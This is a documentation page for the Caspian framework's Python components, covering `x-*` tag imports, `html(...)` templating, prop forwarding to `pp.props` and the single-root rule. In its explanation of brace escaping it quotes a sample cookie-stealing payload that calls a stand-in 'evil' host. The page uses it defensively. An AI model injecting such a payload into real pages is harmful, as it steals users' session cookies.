---
title: Components
description: Use this page when the task mentions `@component`, reusable UI, component granularity or render ownership, HTML-first `x-*` component tags, component imports, forwarding Python component props to `pp.props`, `get_attributes(...)`, `merge_classes(...)`, `twMerge(...)`, or where shared components belong in a Caspian project.
related:
  title: Related docs
  description: Use the structure guide for file placement, the routing guide for route templates, the PulsePoint guide for browser-side scripts, and the data guide for component-owned RPC flows.
  links:
    - /docs/project-structure
    - /docs/core-runtime-map
    - /docs/routing
    - /docs/pulsepoint
    - /docs/pulsepoint-runtime-map
    - /docs/fetch-data
    - /docs/index
---

Components in Caspian are implemented as Python functions decorated with `@component`. Each component is a single Python file: the markup lives inline as a triple-quoted string passed to `html(...)`.

In the module that uses a component — a route `index.py`, a `layout.py`, or another component — import it with a normal Python import and render it with an HTML-first kebab-cased `x-*` tag such as `<x-my-component />` or `<x-my-component>...</x-my-component>`. The Python import is what makes the tag resolve.

Treat that `x-*` form as the current Caspian component contract for authored templates.

Component tooling scans Python files under the paths listed in `caspian.config.json`. When `componentScanDirs` includes `src/`, `src/components/` is the clean default location for reusable UI, even though any scanned path can work.

As the app grows, treat `src/components/` as the default home for reusable application UI. Keep route-owned markup in `src/app/`, and keep non-UI helpers or services in `src/lib/`.

## Mental Model

- Use a Python component when you want a reusable server-rendered UI building block.
- Return an HTML string directly for small presentational components.
- Use `html(...)` to keep markup, server interpolation, and a PulsePoint `<script>` inline in the Python file. It renders through Caspian's Jinja env, so `{{ ... }}` is server-side and `{ ... }` stays for PulsePoint. `html(...)` is the markup entrypoint for every component.
- Split UI by responsibility the way you would split React components. Single-file component authoring is a file shape, not permission to put a full page, dashboard, or all tab panels into one Python file. A large responsibility means more components.
- **The React comparison in this document is about decomposition and single-root shape only — never about syntax.** Component markup is plain HTML compiled by PulsePoint. JSX in a component template (`{cond && <div/>}`, `{list.map(...)}`, unquoted `class={...}`, `className`, `onClick`) corrupts the markup before the compiler runs, and an unquoted brace attribute silently blanks the whole page. Read [pulsepoint.md](./pulsepoint.md) "PulsePoint Is Not JSX" first.
- When a component needs first-party interactivity, bind events in the component template with PulsePoint-handled `on*` attributes and keep state in `pp.state(...)`; do not build id-driven `querySelector(...)` or `addEventListener(...)` wiring for normal component behavior.
- Keep page-level workflows in `src/app/`, move reusable UI into `src/components/`, and keep helpers, services, validators, and adapters in `src/lib/`.

## Framework Internals Note

When the task is about component internals rather than normal app-owned components, these runtime files are the most relevant:

- `.venv/Lib/site-packages/casp/component_decorator.py` owns `@component`, `Component`, and the inline `html(...)` helper (including module-scope capture for `x-*` resolution and direct calls).
- `.venv/Lib/site-packages/casp/components_compiler.py` owns `x-*` tag resolution (from a component's Python module imports and the scope captured by `html(...)` and layouts), parent-scope expansion of slot content, root validation, and `pp-component` injection.
- `.venv/Lib/site-packages/casp/html_attrs.py` owns `get_attributes(...)` and the Python-side `merge_classes(...)` contract.
Use [core-runtime-map.md](./core-runtime-map.md) when you need the broader Python runtime-module map. Use [pulsepoint-runtime-map.md](./pulsepoint-runtime-map.md) when a component task is specifically about browser-side PulsePoint state, refs, context, portals, events, RPC, or SPA behavior.

## Basic Component

This is the simplest pattern: accept props, assemble the final class value, and return HTML.

```python
from casp.component_decorator import component
from casp.html_attrs import get_attributes, merge_classes

@component
def Container(children: str = "", **props) -> str:
    incoming_class = props.pop("class", "")
    final_class = merge_classes("mx-auto max-w-7xl px-4", incoming_class)

    attributes = get_attributes({
        "class": final_class,
    }, props)

    return f'<div {attributes}>{children}</div>'
```

Notes:

- `children` receives the inner content passed between opening and closing tags.
- `**props` lets the component accept additional HTML attributes such as `id`, `data-*`, and `aria-*`.
- The runtime normalizes `class`, `className`, and `class_name` into one `class` value before the component is called.
- Pass the `merge_classes(...)` result straight into `get_attributes(...)` or the rendered `class` attribute; do not wrap it in another helper.

## Tailwind Merge Contract

When `caspian.config.json` has `tailwindcss: true`, Caspian uses a frontend-first Tailwind merge contract.

- In Python components, use `merge_classes(...)` to assemble class defaults plus incoming class props.
- `merge_classes(...)` emits a frontend-ready `{twMerge(...)}` expression instead of doing Python-side Tailwind conflict resolution.
- In authored PulsePoint markup and scripts, use global `twMerge(...)` directly for attribute expressions and script-local derived values.

Python example:

```python
from casp.component_decorator import component
from casp.html_attrs import get_attributes, merge_classes

@component
def IconButton(**props) -> str:
    incoming_class = props.pop("class", "")
    final_class = merge_classes("size-4 rounded-md", incoming_class)

    attributes = get_attributes({
        "class": final_class,
    }, props)

    return f'<button {attributes}></button>'
```

Authored PulsePoint examples:

```html
<p class="{twMerge(baseClass, inputClass)}">Merged badge preview</p>

<script>
  const merged = twMerge(baseClass, inputClass);
</script>
```

## Import And Use Components

Import components with normal Python imports at the top of the module whose markup uses them, then render them as `x-*` tags.

```python
from casp.component_decorator import html
from src.components.Container import Container


def page():
    return html(r"""
<x-container class="py-10">
  <h1>Dashboard</h1>
</x-container>
""")
```

The Python import is the bridge between the component export and the `x-*` tag you author: any `Component` object present in the module's globals is resolvable from that module's markup.

- The exported component name maps to the tag you render by kebab-casing it and prefixing `x-`, such as `Container` for `<x-container />` or `CommandDialog` for `<x-command-dialog />`.
- If one Python file exports several `@component` functions, import all the names you use from that exact file: `from src.lib.maddex.Breadcrumb import Breadcrumb, BreadcrumbItem, BreadcrumbList`.
- A directory of one-component-per-file modules can also be imported straight from the package, without naming each file: `from src.lib.ppicons import Search, ArrowLeft` gives `<x-search />` and `<x-arrow-left />`. Python binds the *submodules* here (a component directory has no re-exports for `Search` to come from), so Caspian unwraps a module binding that defines a component under its own file name — `Search.py` exporting `Search`. Aliasing works as it does for a direct import, and the alias names the tag: `from src.lib.ppicons import Search as MagnifyIcon` renders `<x-magnify-icon />`. A module with no same-named component (`utils.py`, `import os`, the package itself) is never mistaken for a tag, and neither is a file whose function is missing the `@component` decorator — that still raises `UnknownComponentError`. This form reaches only the component named after its file, so a multi-export file's other exports still use the previous bullet: `from src.lib.maddex import BreadcrumbItem` is a plain `ImportError`, because no `BreadcrumbItem.py` exists.
- When a route or component directory name is not a valid Python identifier (hyphens, `(group)` folders), bind the component through `importlib`: `TeamMemberActions = importlib.import_module("src.app.table-with-dropdownmenu.TeamMemberActions").TeamMemberActions`. The assignment puts the Component in module globals, which is all tag resolution needs. Importing the module itself — `importlib.import_module("...TeamMemberActions")` with no trailing attribute — resolves too, by the same unwrapping rule.

In section-based apps, follow the same mental model as the Next.js App Router: import shared shell components such as sidebars, topbars, breadcrumbs, and section frames in the parent folder's `layout.py`, then import page-specific components in each child route's `index.py`.

### Same-File Component Exports

Caspian does not require one Python file per component. A single file can export a main component plus related subcomponents.

If `Breadcrumb.py` defines `Breadcrumb`, `BreadcrumbList`, `BreadcrumbItem`, `BreadcrumbLink`, `BreadcrumbPage`, and `BreadcrumbSeparator`, import those names from `Breadcrumb.py` itself:

```python
from src.lib.maddex.Breadcrumb import (
    Breadcrumb,
    BreadcrumbItem,
    BreadcrumbLink,
    BreadcrumbList,
    BreadcrumbPage,
    BreadcrumbSeparator,
)
```

```html
<div class="dashboard-topbar">
  <x-breadcrumb class="dashboard-breadcrumbs" aria-label="Dashboard breadcrumbs">
    <x-breadcrumb-list class="dashboard-breadcrumbs__list">
      <x-breadcrumb-item class="dashboard-breadcrumbs__item">
        <x-breadcrumb-link href="/dashboard">Dashboard</x-breadcrumb-link>
      </x-breadcrumb-item>
      <x-breadcrumb-separator class="dashboard-breadcrumbs__separator" />
      <x-breadcrumb-item class="dashboard-breadcrumbs__item">
        <x-breadcrumb-page class="dashboard-breadcrumbs__page">Reports</x-breadcrumb-page>
      </x-breadcrumb-item>
    </x-breadcrumb-list>
  </x-breadcrumb>
</div>
```

Do not invent per-name modules for symbols that do not have their own file. If `BreadcrumbItem` lives inside `Breadcrumb.py`, import it from `src.lib.maddex.Breadcrumb`, not from a `BreadcrumbItem` module that does not exist.

## Single-File Components With `html(...)`

A component keeps its markup, server-side interpolation, and PulsePoint `<script>` inline in the Python file. Import `html` from `casp.component_decorator` and return `html(r"""...""", **context)`.

Single-file does not mean one file per page. Treat each single-file component like a React component with one clear responsibility. If a screen has an overview tab, an activity tab, and a settings tab, those substantial panels should normally be separate components such as `OverviewTab.py`, `ActivityTab.py`, and `SettingsTab.py`, assembled by a small tab shell or the route template. If one component is growing because it owns unrelated forms, tables, charts, and action bars, split those responsibilities and pass the needed data as props.

`html(...)` renders the string through Caspian's Jinja environment, so three brace dialects coexist without colliding:

- `{{ value }}` is server render (Python to HTML).
- `{{ value | json }}` safely serializes a server value into a `<script>`.
- `{# comment #}` is a Jinja comment, stripped from output.
- `{ value }` is left untouched for PulsePoint client reactivity.

```python
from casp.component_decorator import component, html
from casp.html_attrs import get_attributes, merge_classes

@component
def UserCard(user, **props):
    attrs = get_attributes({
        "class": merge_classes("card", props.pop("class", "")),
    }, props)

    # html
    return html("""
      <div {{ attrs }}>
        <h3>{{ user.name }}</h3>
        <button onclick="setLikes(likes + 1)">Likes: {likes}</button>
        <script>
          const [likes, setLikes] = pp.state({{ user.likes | json }});
        </script>
      </div>
    """, attrs=attrs, user=user)
```

The returned value is `Markup`, so the normal pipeline still injects `pp-component` on the single root and defers that root inside an inert template. The plain component `<script>` remains plain; PulsePoint captures its source before materialization and evaluates it in component scope. Prefer a raw string (`r"""..."""`) whenever the markup's `<script>` contains backslashes (regex, `\n`).

### Receiving Props In A Python Component

There are two separate prop handoffs in a single-file Python component, and the Python component is the bridge between them:

1. Caspian converts attributes on the parent-authored `x-*` tag from kebab-case to camelCase and calls the Python component with them as string keyword arguments. PulsePoint expressions are not evaluated at this stage: `open="{permOpen}"` arrives in Python as the literal string `"{permOpen}"`, and `on-apply="{applyPermissions}"` arrives as `onApply="{applyPermissions}"`.
2. The Python component must deliberately re-emit the props it wants the browser component to receive as attributes on its rendered root. Build those attributes with `get_attributes({...}, props)`, place `{{ attributes }}` on the single native root, and pass `attributes=attributes` to `html(...)`.
3. PulsePoint derives `pp.props` from that rendered root. It evaluates pure `{expression}` attribute values in the parent component's scope, then exposes kebab-case root attribute names as camelCase keys such as `on-apply` -> `pp.props.onApply`.

Python function parameters do not automatically become root attributes or browser props. A parameter that is accepted but not included in `get_attributes(...)` is server-only and is discarded when the Python call returns.

Minimal end-to-end example:

Parent (a page or component module that has `from src.components.UserPermissionsDialog import UserPermissionsDialog` at the top; its markup then reads):

```html
<div>
  <button onclick="setPermOpen(true)">Edit permissions</button>
  <x-user-permissions-dialog
    open="{permOpen}"
    value="{permValue}"
    on-open-change="{setPermOpen}"
    on-apply="{applyPermissions}"
  />

  <script>
    const [permOpen, setPermOpen] = pp.state(false);
    const [permValue, setPermValue] = pp.state([]);

    function applyPermissions(nextValue) {
      setPermValue(nextValue);
      setPermOpen(false);
    }
  </script>
</div>
```

`UserPermissionsDialog.py`:

```python
from casp.component_decorator import component, html
from casp.html_attrs import get_attributes, merge_classes

@component
def UserPermissionsDialog(
    open=None,
    value=None,
    onOpenChange=None,
    onApply=None,
    **props,
):
    incoming_class = props.pop("class", "")
    attributes = get_attributes({
        "class": merge_classes("permissions-dialog", incoming_class),
        "open": open,
        "value": value,
        "onOpenChange": onOpenChange,
        "onApply": onApply,
    }, props)

    # html
    return html("""
      <section {{ attributes }} hidden="{!open}">
        <p>Selected permissions: {value.length}</p>
        <button onclick="onOpenChange(false)">Cancel</button>
        <button onclick="onApply(value)">Apply</button>

        <script>
          const { open, value, onOpenChange, onApply } = pp.props;
        </script>
      </section>
    """, attributes=attributes)
```

The browser can evaluate `permOpen`, `permValue`, `setPermOpen`, and `applyPermissions` because their literal brace expressions survived the Python render and were placed on the child root. If `{{ attributes }}` or `attributes=attributes` is missing, `pp.props` has none of those forwarded keys and may be completely empty.

Pitfalls:

- **Silent empty `pp.props`:** accepting `open`, `value`, or callback parameters in Python without re-emitting them on the root raises no server error and no browser warning. The component renders, but those keys are absent from `pp.props` and values such as `pp.props.open` are `undefined`.
- **Reserved/native attribute collisions:** forwarded props are real DOM attributes. A prop named `title` produces the native `title="..."` tooltip on the root. Prefer a component-specific non-native name such as `user-name` (Python `userName`, browser `pp.props.userName`) when native behavior is not intended.
- `get_attributes(...)` omits empty strings. To pass a reactive boolean, prefer a pure expression such as `disabled="{isDisabled}"` rather than relying on a bare empty attribute to survive the Python bridge.

### Every Prop A Template Reads Must Be Forwarded To The Root

This is the most common cause of `hidden="{...}"`, `class="{...}"`, and value bindings silently failing inside a Caspian component.

PulsePoint computes `pp.props` from the **rendered root element's attributes**, not from the Python signature. `get_attributes(defaults, overrides)` emits only the keys present in the two dictionaries it is given. A named Python parameter is consumed out of `**props`, so it is no longer in the passthrough dictionary — if it is not also listed in `defaults`, it never reaches the root, and `pp.props.<name>` is `undefined`.

Nothing warns about this. The server renders, the component mounts, and every expression referencing the missing prop quietly evaluates against `undefined`.

Broken — only `controlsVisible` reaches the browser:

```python
@component
def PlayerControls(title="Movie", playing=None, volume=None, controlsVisible=None, **props):
    attributes = get_attributes({"controlsVisible": controlsVisible}, props)
```

```html
<!-- volume is undefined: `undefined === 0` and `undefined > 0` are both false, -->
<!-- so both icons render and the toggle looks dead -->
<x-volume hidden="{volume === 0}" />
<x-volume-x hidden="{volume > 0}" />
```

Fixed — forward every prop the template references:

```python
attributes = get_attributes({
    "title": title,
    "playing": playing,
    "volume": volume,
    "controlsVisible": controlsVisible,
}, props)
```

Boolean toggles hide this bug well: with `playing` undefined, `hidden="{playing}"` and `hidden="{!playing}"` still pick one branch, so the initial paint can look correct while never reacting to state changes.

#### Forwarding Alone Is Not Enough: The Value-Type Contract

Listing a prop fixes presence, not type. What `pp.props` receives depends on how the value reaches the root attribute:

| Attribute on the rendered root | `typeof pp.props.x` | Value |
| --- | --- | --- |
| `volume="{vol}"` — an unevaluated brace expression | the real type | evaluated in the **parent** component's scope |
| `volume="0"` — a literal, from a Python value | `"string"` | `"0"` |
| `is-fullscreen="true"` — a literal | `"string"` | `"true"` (and `"false"` is also truthy) |
| `bare-flag` — valueless attribute | `"boolean"` | `true` |
| `class="..."` — a JS reserved word | `"undefined"` | dropped from `pp.props` entirely |
| not present | `"undefined"` | — |

Consequences to design around:

- `volume === 0` is **false** when the value arrived as the literal string `"0"`. Strict comparisons only behave numerically when the parent passed a brace expression such as `volume="{vol}"`, which survives the Python render as literal text and is evaluated in parent scope by the browser. When a Python default or server-computed value is the source, compare loosely, coerce with `Number(...)`, or normalize in the component script.
- Reserved words are stripped by the runtime, so `pp.props.class` never exists. Use `class_name`/`className` in Python for the DOM `class` attribute, and a non-reserved prop name when the script must read the value.
- `get_attributes(...)` omits `None`, `False`, `""`, and empty collections. A prop listed with one of those values is still absent from `pp.props`, so `pp.props.playing` is `undefined` rather than `false`. Read booleans defensively (`!!pp.props.playing`) or default them when destructuring.
- Forwarded props are real DOM attributes and camelCase becomes kebab-case, so `isFullscreen` renders as `is-fullscreen` and returns as `pp.props.isFullscreen`.

#### Checklist

For any Python component that accepts props, calls `get_attributes({...}, props)`, and has a `<script>` reading `pp.props`:

1. Forward every incoming prop the script/template needs through `get_attributes`; explicitly include named Python parameters consumed out of `**props`. Locally derived bindings and state are not incoming props and do not belong in the defaults dictionary.
2. Confirm `{{ attributes }}` is on the single root and `attributes=attributes` is passed into `html(...)`.
3. For strict comparisons (`=== 0`, `=== "x"`), confirm the value arrives as a brace expression, or coerce it in the script.
4. Avoid prop names that are JS reserved words or unintended native attributes (`title`, `class`, `for`).
5. Read `pp.props` in the owning script and expose top-level names for markup. For example, `const dialogOpen = !!pp.props.open;` feeds `open="{dialogOpen}"`; never author `open="{!!pp.props.open}"`. Forwarding to the root and exporting script bindings are separate requirements. See [Read props in the script, bind names in markup](./pulsepoint.md#read-props-in-the-script-bind-names-in-markup) for nested/slot failures and corrected examples.
6. Reopen the affected UI, change the controlling props, and inspect frontend errors and warnings after interactions. Follow [Frontend verification for agents](./testing.md#frontend-verification-for-agents); a successful Python render does not prove browser evaluation succeeded.

### HTML Attribute Helper Contract

`casp.html_attrs.get_attributes(defaults, overrides=None)` builds one Jinja-safe attribute string for a component root:

- It processes the first dictionary, then the optional second dictionary. A non-empty value in `overrides` replaces the same normalized key from `defaults`. An omitted/empty override does not delete an already-renderable default. This is why the usual component pattern passes authored defaults first and remaining `**props` second.
- It resolves Python-safe aliases before normalization: `class_name` and `className` become `class`, `html_for` and `htmlFor` become `for`, `defaultValue` becomes `defaultvalue`, and `defaultChecked` becomes `defaultchecked`.
- It converts every other camelCase key to kebab-case, so `onOpenChange` renders as `on-open-change` and later becomes `pp.props.onOpenChange` in PulsePoint.
- It omits keys whose value is `None`, `False`, an empty string, or an empty/falsy list, tuple, or set. `True` renders as the explicit string `"true"`; non-empty iterables are space-joined.
- It HTML-escapes attribute values and returns `Markup`, so `{{ attributes }}` is not double-escaped by Jinja.
- Passing `**props` as the second dictionary is the passthrough contract for unconsumed `id`, `data-*`, `aria-*`, reactive expressions, callbacks, and other boundary attributes. Pop or otherwise consume a prop first when it should not be forwarded or when it has already been merged into a default.

`casp.html_attrs.merge_classes(*classes)` flattens truthy strings and truthy items from lists, tuples, or sets:

- When `caspian.config.json` has `tailwindcss: false`, it joins the class parts with spaces.
- When `tailwindcss: true`, it emits a PulsePoint expression such as `{twMerge("base classes", incomingClass)}` so the browser's global `twMerge(...)` resolves Tailwind conflicts after parent-scope prop evaluation.
- An incoming pure `{expression}` becomes an expression argument rather than a quoted string. An existing `{twMerge(...)}` expression is preserved or incorporated without nesting another `twMerge(...)` call.
- Empty inputs produce an empty string, which `get_attributes(...)` omits.
- When combining a default class with incoming `**props`, remove the incoming `class` from `props` before passing `props` as overrides; otherwise that later override replaces the merged class attribute.

Rules for inline `html(...)`:

- The single-root rule still applies: exactly one top-level element with any `<script>` nested inside it.
- Keep the component focused on one UI responsibility. Prefer composing several single-file components over one long Python file that contains multiple sections, tab panels, or workflows.
- Pass data, labels, variants, current selection, counts, permissions, or callbacks as props instead of making child components reach back into route markup or duplicate parent state.
- Component attributes are props regardless of the value type. Kebab-case names become camel-cased in `pp.props`, so callbacks may be authored as `on-open-change="{setOpen}"`, `open-change="{setOpen}"`, or `select-first="{selectFirst}"` according to the component API. The `on-` prefix is conventional, not required. Lowercase native DOM event attributes such as `onclick` and `oninput` remain events on the boundary element; use `on-click` only when the component API intentionally exposes an `onClick` prop.
- Autoescaping is ON (Jinja default), so `{{ value }}` escapes HTML automatically and user text is safe without `| e`. The flip side: trusted HTML you want rendered as-is must be `Markup(...)` or piped through `| safe`.
- Braces are escaped too, and for a reason HTML escaping does not cover. PulsePoint compiles the *rendered DOM*, turning any `{expr}` that parses as JavaScript into an evaluated expression. Braces are not HTML-special, so a stored value like `{fetch('//evil/'+document.cookie)}` would survive autoescape and then execute. The engine's Jinja `finalize` hook therefore encodes `{` and `}` as `&#123;`/`&#125;` on every non-`Markup` value, and the escaped entities render as literal braces.
- `Markup` is the trust boundary for both escapes. `| safe`, `Markup(...)`, `get_attributes(...)`, `merge_classes(...)`, the `json`/`dump` filters, and `children` all return `Markup`, so framework-generated PulsePoint syntax such as `{twMerge(...)}` stays live. The rule for new helpers: one that *emits* PulsePoint syntax must return `Markup`; one that *formats user data* must not, or it re-opens the injection.
- Consequence worth knowing: you cannot build a PulsePoint expression on the server by interpolating a plain string (`class="{{ some_expr }}"` renders inert). Author the expression in the template, or return `Markup` from the helper that produces it.
- A `children` value is auto-marked safe, so `{{ children }}` renders nested component markup correctly without `| safe`.
- Do not use a Python f-string for the markup. PulsePoint single braces `{ ... }` would collide with f-string interpolation, the string would skip autoescaping while still being marked trusted, and the `<x-*>` scope stash would be skipped. Use a **raw** triple-quoted string — `html(r"""...""")`. Raw matters beyond regexes: a non-raw literal resolves `\n`, `\t`, and `\s` inside the component `<script>` at Python-parse time, so the JavaScript that reaches the browser is not the JavaScript on screen.
- A long client script is a smell regardless of file size; move heavy work into `@rpc()` actions or smaller composed components rather than growing one component's `<script>`.

The leading `# html` comment above the string is an optional editor hint: some editors color the HTML inside a string tagged that way (JetBrains uses `# language=HTML`). It has no runtime effect.

### Single-Root Inside `html(...)`: Script Goes In The Root, Not Below It

The most common single-file mistake is returning a parent element and then a sibling `<script>` underneath it. The string handed to `html(...)` is the whole component template, so the PulsePoint `<script>` belongs **inside** the single top-level element.

A `<script>` after the closing tag is a second top-level node, which makes the component a *fragment* — quietly, with no error. That is worse than an error when it is unintended: a fragment has no root element, so it **cannot receive props**, and `pp.props` is silently empty until some call site passes an attribute and gets `FragmentPropsError`. Keep the script inside the root unless the sibling shape is deliberate. See "Single-Root Rule" below for the full contract.

Think of the returned string exactly like the one node a React component returns: everything, including the script, lives inside it.

Good — the `<script>` is inside the single root:

```python
from casp.component_decorator import component, html

@component
def Counter(label: str = "Clicks", **props):
    # html
    return html("""
      <div class="counter">
        <h3>{{ label }}</h3>
        <button onclick="setCount(count + 1)">{count}</button>

        <script>
          const [count, setCount] = pp.state(0);
        </script>
      </div>
    """, label=label)
```

Bad — the `<script>` is a sibling after the root, so the string has two top-level nodes:

```python
from casp.component_decorator import component, html

@component
def Counter(label: str = "Clicks", **props):
    # html
    return html("""
      <div class="counter">
        <h3>{{ label }}</h3>
        <button onclick="setCount(count + 1)">{count}</button>
      </div>

      <script>
        const [count, setCount] = pp.state(0);
      </script>
    """, label=label)
```

The fix is usually the same: move the `<script>` above the root's closing tag so the whole return value is one element. If the component genuinely needs sibling sections, leaving them as siblings is also legal — that makes it a *fragment*, and the compiler frames it with a comment-pair boundary instead of injecting `pp-component` onto a root. A fragment cannot receive props, so wrap in one outer element whenever the component takes any.

Pages and layouts take a different shape: `index.py` and `layout.py` return sibling top-level nodes inside a `display: contents` boundary host, not a comment pair. See [pulsepoint.md](./pulsepoint.md) "Multi-root pages and layouts" and "Fragment components".

A template whose authored root is an `x-*` tag keeps its `<script>` too. The script travels as that child's slot content, wrapped in `<template pp-owner="…">`, and the runtime resolves the owner — the composition host's id for a component, or the alias `app` for a page or layout, which resolves to the authoring page or layout boundary — so the template that wrote the script is the one that executes it, in its own scope. No wrapper element is needed around a composition root. See [pulsepoint.md](./pulsepoint.md) "A slot-authored `<script>` belongs to the template that authored it".

## Component Imports Are Python Imports

A component renders other components with `x-*` tags. The way Caspian learns which component a tag refers to is a real Python import at the top of the module: a component's own `x-*` tags resolve from the Component objects imported into that module.

Python imports are the unambiguous source of truth for which component a tag refers to, they give normal editor navigation, and they prevent same-name collisions across directories. If `variantA/Tag.py` and `variantB/Tag.py` both export `Tag`, the Python import in each consumer file decides which `Tag` its `<x-tag>` resolves to.

```python
from casp.component_decorator import component, html
from src.components.variantA.Tag import Tag  # resolves <x-tag> below

@component
def Panel(children="", **props):
    # <x-tag> resolves from the Python import above,
    # so it is unambiguously variantA's Tag.
    # html
    return html("""
      <div class="panel">
        <x-tag>inside-panel</x-tag>
        {{ children }}
      </div>
    """, children=children)
```

Runtime resolution precedence for an `x-*` tag inside a component's own output, lowest to highest:

- inherited components from an ancestor template
- the component's own Python module imports

So a component's Python import wins over an inherited same-name component.

### What Counts As An Import

Tag resolution scans the module's globals, and two kinds of binding resolve:

- **The Component itself**, from `from src.components.variantA.Tag import Tag`.
- **A module that exports a component under its own file name**, from `from src.lib.ppicons import Search`. This is the shape a component *directory* produces: a generated directory is one component per file with no `__init__.py`, so `Search` is not a name the package defines and Python imports the submodule `src.lib.ppicons.Search` instead. Caspian unwraps that binding to the `Search` inside `Search.py`, which is why importing a whole row of icons in one statement works.

Both forms follow the *binding* name, not the file name, so an alias renames the tag: `from src.lib.ppicons import Search as MagnifyIcon` renders `<x-magnify-icon />`.

Only those two resolve. A module with no same-named component is left alone, so an ordinary `import os`, a helper module such as `from src.lib.maddex import utils`, and a bare package import never become tags. Neither does a component file whose function is missing the `@component` decorator — the import looks correct and the tag still raises `UnknownComponentError`, so check the decorator before suspecting the import.

### Direct-Call Composition (Calling A Component As A Function)

A component can compose another component two ways: by writing its `<x-*>` tag, or by calling it as a plain Python function and interpolating the result with `{{ }}` (React-style). Both work, and both resolve nested `<x-*>` tags from the callee's own Python module imports.

```python
from casp.component_decorator import component, html
from src.components.Panel import Panel  # Panel's markup contains <x-tag>

@component
def Page(**props):
    panel_markup = Panel()  # direct call, not <x-panel>
    # html
    return html("""
      <div>
        {{ panel_markup }}
      </div>
    """, panel_markup=panel_markup)
```

Even though `Panel()` returns a plain string here, its nested `<x-tag>` still resolves from `Panel`'s own module imports, exactly as if `Panel` had been reached through an `<x-panel>` tag. The calling component does not need to import `Tag` — a component's tags always resolve against the module that authored them.

Notes:

- Resolution stays import-driven and per-module, so the same-name/no-collision guarantee holds: the `<x-tag>` inside `Panel`'s output resolves to whatever `Tag` `Panel`'s module imported, regardless of where `Panel()` was called from.
- Prefer the `<x-*>` tag form for readability; reach for the direct call when you need the rendered markup as a value (e.g. to pass into another context key or compose conditionally in Python).
- This is handled entirely by the runtime; there is nothing extra to author. The owning functions live in `component_decorator.py` and `components_compiler.py` (see the Framework Internals Note above).

### Slot Content Resolves In The Parent Scope

Component tags written as slot content (children passed between a component's opening and closing tags) resolve in the scope where they were authored, not in the child component's scope. This matches slot semantics in other component systems: a `<x-tag>` written by the parent stays bound to the parent's `Tag` even when it is slotted into a child that has its own `Tag`. The component that authors a tag in markup must import that component, the same way it would for any tag it renders directly.

The same rule governs the browser side: an `on*` handler on slot content is evaluated in the authoring template's component scope, so the function it calls must be declared by that template's owned script. Moving the function into the child that renders the slot — or wrapping the element in a component of its own — does not change the owner. See [pulsepoint.md](./pulsepoint.md) "A handler in slot content runs in the authoring template's scope".

## Component Granularity And Responsibility

Prefer small, named components that match the responsibility a developer would expect from a React-style component tree.

Use this split before writing markup:

- Page route: owns page assembly, first-render context, and route-level workflows.
- Shell component: owns shared layout around a page area, such as a tab list, sidebar, toolbar frame, or dashboard section wrapper.
- Section component: owns one visible content area, such as an overview panel, analytics section, settings form, activity list, billing table, or user card grid.
- Leaf component: owns repeated or reusable details, such as cards, rows, badges, buttons with behavior, empty states, and field groups.

For example, a tabbed account page should be assembled from focused parts:

```text
src/components/account/
  AccountTabs.py
  AccountOverviewTab.py
  AccountSecurityTab.py
  AccountBillingTab.py
```

`AccountTabs.py` can own the selected tab state and render the tab controls, while each tab panel owns its own markup and receives props such as `user`, `plan`, `sessions`, or `can_edit`. This keeps PulsePoint state close to the interaction that owns it and keeps each file readable.

Do not create a single `AccountPage.py` or `DashboardTabs.py` that contains every tab, form, table, metric card, and modal just because `html(...)` makes it possible. When the file starts needing headings in comments to separate unrelated areas, those headings are usually component boundaries.

Related subcomponents may live in one Python file only when they are tiny and tightly coupled, such as `Tabs`, `TabsList`, `TabsTrigger`, and `TabsContent` primitives, or a component plus two very small private helpers. For app-specific page chunks, prefer one exported component per file with a name that explains its role.

Props are the boundary between components. Pass parent-owned data and configuration down through attributes or direct Python calls, keep local interactive state inside the component that owns the behavior, and use slot content when the parent needs to provide authored child markup. If two sibling chunks need the same server data, load it in the route's `page()` or a shared helper and pass the relevant pieces into each component.

Component boundaries are also performance ownership boundaries. A value typed into a search field should not normally rerender a page-sized component that also owns a large card grid, several dialogs, and unrelated forms. Put high-frequency state in the smallest component that actually renders from it, and pass only the committed result or callback across the boundary. Do not split every element into a component; split where update frequency and subtree cost differ. A small search/toolbar component beside a result-list component is a useful boundary, while a wrapper that still owns both states and rerenders both subtrees is not.

Before blaming the PulsePoint runtime for a slow interaction, check whether the component explicitly requested the expensive render. Debouncing `setQuery(...)` still rerenders the query's owner when the timer fires. If the query is used only to build an RPC payload, keep it in `pp.ref(...)`, debounce the RPC, and keep returned rows in `pp.state(...)`. See [pulsepoint.md](./pulsepoint.md#high-performance-authoring) and [fetch-data.md](./fetch-data.md#search-filters-and-request-races).

## Component Root Refs

`pp-ref` on an `x-*` tag is a parent-owned component ref. It resolves in the scope that authored the component tag and binds to the component's rendered root DOM element. Generated component kits that accept `**props` and spread unknown attributes need no `forwardRef` wrapper and should not special-case `pp-ref`.

```html
<div>
  <x-input pp-ref="{codeInput}" />
  <button onclick="codeInput.current?.focus()">Focus code</button>

  <script>
    const codeInput = pp.ref(null);
  </script>
</div>
```

For ref purposes, a component's root is the single native element that receives its injected `pp-component` boundary. If a composition component renders another `x-*` component as its root, Caspian forwards the ref through its layout-neutral boundary host to the eventual concrete DOM root.

The default takes precedence over catch-all `**props`: `pp-ref` is reserved for root ref forwarding and is not delivered in that dictionary. A component that intentionally wants `pp-ref` as ordinary data can opt out by declaring an explicit camel-case `ppRef` parameter, for example `def Inspector(ppRef="", **props)`. That explicit declaration consumes the prop, disables automatic root forwarding for that component invocation, and makes the component responsible for how the value is used. Use this escape hatch sparingly; ordinary UI primitives should keep the standard root-ref contract.

## Auto-Injected `pp-component` And Plain Component Scripts

Treat `pp-component="componentName"` as framework output, not authored source. The canonical authored-vs-runtime explanation lives in [pulsepoint.md](./pulsepoint.md).

- Do not manually add `pp-component="..."` to route, layout, or component templates.
- The Python render pipeline injects `pp-component` onto the single root element during render.
- Add a plain, untyped `<script>` only when the route or component actually needs PulsePoint logic, and keep it inside that single root element.
- `main.py` preserves that plain script while deferring the root inside an inert template.
- Before materialization or morph insertion, PulsePoint captures and empties the script so the browser cannot execute it natively, then evaluates the captured source in component scope.
- If a runtime example shows `pp-component`, treat that attribute as rendered output rather than authored source.

## Single-Root Rule

A component template should normally render exactly one authored top-level parent node. Sibling top-level nodes are legal and make the component a *fragment* (see [pulsepoint.md](./pulsepoint.md) "Fragment components"), but only a single-root component can receive props.

In source, that parent may be a native HTML element or a single imported `x-*` component tag. After component expansion, the template must still resolve to one final native HTML root so Caspian has exactly one place to inject `pp-component`.

